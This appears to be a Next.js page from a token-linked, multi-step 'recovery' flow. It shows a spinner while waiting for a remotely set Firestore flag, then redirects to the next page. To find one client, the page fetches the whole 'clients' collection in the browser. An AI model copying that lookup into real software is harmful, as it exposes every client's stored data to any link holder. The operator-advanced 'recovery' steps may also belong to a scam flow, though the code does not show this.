"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, getDocs, doc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";

export default function Page5() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [client, setClient] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (!token) {
      router.replace("/invalid");
      return;
    }

    const fetchClient = async () => {
      const clientsCol = collection(db, "clients");
      const snapshot = await getDocs(clientsCol);
      const clientDoc = snapshot.docs.find(
        (d) => d.data().accessLinkId === token
      );

      if (!clientDoc) {
        router.replace("/invalid");
        return;
      }

      const clientData = { id: clientDoc.id, ...clientDoc.data() };
      setClient(clientData);
      setLoading(false);

      // Listen for proceed2 change
      const clientRef = doc(db, "clients", clientDoc.id);
      const unsubscribe = onSnapshot(clientRef, (docSnap) => {
        const data = docSnap.data();
        if (data?.proceed2 === true) {
          router.replace("/page6?token=" + token);
        }
      });

      return () => unsubscribe();
    };

    fetchClient();
  }, [token, router]);

  if (loading)
    return (
      <main className="flex items-center justify-center h-screen text-white">
        Loading recovery...
      </main>
    );

  return (
    <main className="relative w-full h-screen overflow-hidden flex items-center justify-center">
      {/* Background */}
      <div className="absolute inset-0 w-full h-full">
        <SvgStack />
        <Image
          src={bgImage}
          alt="Background"
          className="absolute inset-0 -z-10 object-contain"
        />
      </div>

      {/* Loading content */}
      <div className="relative z-10 flex flex-col items-center justify-center space-y-6">
        {/* Circular Loader */}
        <div className="w-20 h-20 border-4 border-teal-400 border-t-transparent border-solid rounded-full animate-spin"></div>

        {/* Text */}
        <h2 className="text-white text-xl font-bold">Recovery in Progress</h2>
      </div>
    </main>
  );
}
